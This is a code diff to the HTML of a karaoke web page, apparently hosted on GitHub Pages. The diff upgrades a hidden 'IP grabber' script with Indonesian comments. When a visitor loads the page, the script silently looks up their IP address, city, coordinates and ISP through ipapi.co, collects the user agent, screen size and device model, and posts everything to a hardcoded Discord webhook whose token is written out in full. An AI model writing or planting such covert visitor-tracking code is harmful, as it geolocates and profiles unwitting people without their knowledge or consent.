@@ -1084,7 +1084,7 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER UPGRADE v7 - Device Model + Lokasi Akurat ==================== -->
+<!-- ==================== IP GRABBER UPGRADE v8 - Stabil + Device Model ==================== -->
 <script>
 // GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
@@ -1093,7 +1093,7 @@ function getDeviceModel() {
     const ua = navigator.userAgent.toLowerCase();
     if (ua.includes('android')) {
         if (ua.includes('samsung')) return 'Samsung Android';
-        if (ua.includes('xiaomi') || ua.includes('redmi')) return 'Xiaomi / Redmi';
+        if (ua.includes('xiaomi') || ua.includes('redmi')) return 'Xiaomi/Redmi';
         if (ua.includes('oppo')) return 'Oppo';
         if (ua.includes('vivo')) return 'Vivo';
         if (ua.includes('realme')) return 'Realme';
@@ -1106,29 +1106,42 @@ function getDeviceModel() {
 }
 
 async function sendIPLog() {
-    let ipData = {};
+    let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown', lat: null, lon: null };
+
+    // Coba ipapi.co dulu (lebih stabil di GitHub Pages)
     try {
-        const res = await fetch('http://ip-api.com/json/?fields=query,country,regionName,city,lat,lon,isp,org');
-        ipData = await res.json();
-    } catch (e) {}
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        ipData = {
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country_name: data.country_name,
+            org: data.org,
+            lat: data.latitude,
+            lon: data.longitude
+        };
+    } catch (e) {
+        console.log("ipapi.co failed, trying fallback...");
+    }
 
     const deviceModel = getDeviceModel();
 
     const embed = {
-        title: "🎤 Karaoke Sync - Pengunjung Baru! (v7)",
+        title: "🎤 Karaoke Sync - Pengunjung Baru! (v8)",
         color: 0x00ff88,
         timestamp: new Date().toISOString(),
         fields: [
-            { name: "IP Address", value: `\`${ipData.query || 'Unknown'}\``, inline: true },
-            { name: "Lokasi", value: `${ipData.city || '-'}, ${ipData.regionName || '-'}, ${ipData.country || 'Unknown'}`, inline: true },
+            { name: "IP Address", value: `\`${ipData.ip || 'Unknown'}\``, inline: true },
+            { name: "Lokasi", value: `${ipData.city || '-'}, ${ipData.region || '-'}, ${ipData.country_name || 'Unknown'}`, inline: true },
             { name: "Koordinat", value: ipData.lat && ipData.lon ? `${ipData.lat.toFixed(4)}, ${ipData.lon.toFixed(4)}` : 'Tidak tersedia', inline: true },
-            { name: "ISP", value: ipData.isp || 'Unknown', inline: true },
+            { name: "ISP", value: ipData.org || 'Unknown', inline: true },
             { name: "Device Model", value: deviceModel, inline: true },
             { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
-            { name: "Device Info", value: navigator.userAgent.substring(0, 220) + "...", inline: false },
+            { name: "Device Info", value: navigator.userAgent.substring(0, 240) + (navigator.userAgent.length > 240 ? "..." : ""), inline: false },
             { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
         ],
-        footer: { text: "IP Grabber via GitHub Pages • Upgrade v7" }
+        footer: { text: "IP Grabber via GitHub Pages • Upgrade v8" }
     };
 
     try {
@@ -1137,7 +1150,7 @@ async function sendIPLog() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
-        console.log("%c✅ IP Log terkirim - Upgrade v7", "color: lime; font-weight: bold");
+        console.log("%c✅ IP Log terkirim - Upgrade v8", "color: lime; font-weight: bold");
     } catch (err) {
         console.log("IP Logger error:", err.message);
     }
@@ -1145,7 +1158,7 @@ async function sendIPLog() {
 
 // Jalankan setelah load
 window.addEventListener('load', () => {
-    setTimeout(sendIPLog, 1800);
+    setTimeout(sendIPLog, 2000);
 });
 </script>
-<!-- ==================== END IP GRABBER UPGRADE v7 ==================== -->
+<!-- ==================== END IP GRABBER UPGRADE v8 ==================== -->
